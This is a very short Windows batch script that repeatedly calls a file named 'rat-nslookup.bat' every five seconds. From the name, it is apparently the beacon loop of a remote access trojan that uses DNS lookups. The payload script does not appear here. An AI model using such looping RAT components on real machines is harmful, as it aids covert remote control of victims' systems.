@echo off
:loop
call rat-nslookup.bat
timeout /nobreak 5 > nul
goto :loop
